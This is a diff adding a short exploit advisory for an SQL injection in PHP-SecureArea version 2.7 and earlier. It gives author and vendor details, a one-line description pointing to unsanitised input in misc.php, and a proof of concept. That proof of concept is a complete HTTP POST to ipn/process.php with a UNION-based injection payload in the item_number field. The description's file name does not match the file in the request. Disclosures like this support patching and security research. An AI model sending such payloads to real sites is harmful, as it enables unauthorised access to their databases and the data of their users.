@@ -1,0 +1,23 @@
+# Exploit Title: PHP-SecureArea <= v2.7 - SQL Injection
+# Date: 30-08-2017
+# Exploit Author: Cryo
+# Contact: https://twitter.com/KernelEquinox
+# Vendor Homepage: https://www.withinweb.com
+# Software Link: https://www.withinweb.com/phpsecurearea/
+# Version: 2.7 and below
+# Tested on: Windows, Linux, Mac OS X
+
+1. Description
+==============
+
+PHP-SecureArea is vulnerable to SQL injection due to lack of input sanitization in the misc.php file.
+
+
+2. Proof of Concept
+===================
+
+POST /phpsecurearea/ipn/process.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+
+item_number=-1' UNION ALL SELECT 1-- -
